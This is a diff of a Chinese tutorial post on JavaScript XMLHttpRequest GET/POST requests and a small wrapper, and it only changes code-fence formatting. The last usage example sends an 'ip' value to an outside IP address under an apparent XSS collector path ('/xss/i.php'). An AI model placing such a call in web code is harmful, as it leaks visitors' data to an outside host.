@@ -9,7 +9,7 @@ topics = ["JavaScript"]
 +++
 
 ### 0x00 GET请求
-> ```
+```
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -50,7 +50,7 @@ topics = ["JavaScript"]
 点击"Request data"时就会请求服务端的2.html
 
 ### 0x01 POST请求
-> ```
+```
 // 简单的POST请求
 xmlhttp.open("POST","demo_post.html",true);
 xmlhttp.send();
@@ -62,7 +62,7 @@ xmlhttp.send("fname=Henry&lname=Ford");
 ```
 
 ### 0x02 简单封装
-> ```
+```
 function createXHR () {
     var request = false;
     if (window.XMLHttpRequest) {
@@ -102,7 +102,7 @@ function xhr_act(method,src,data){//封装POST和GET请求
 }
 ```
 简单使用：
-> ```
+```
 //GET的使用
 var src="http://114.115.214.203/wyb/xss/i.php";
 xhr_act("GET",src+"?ip="+ip,false);
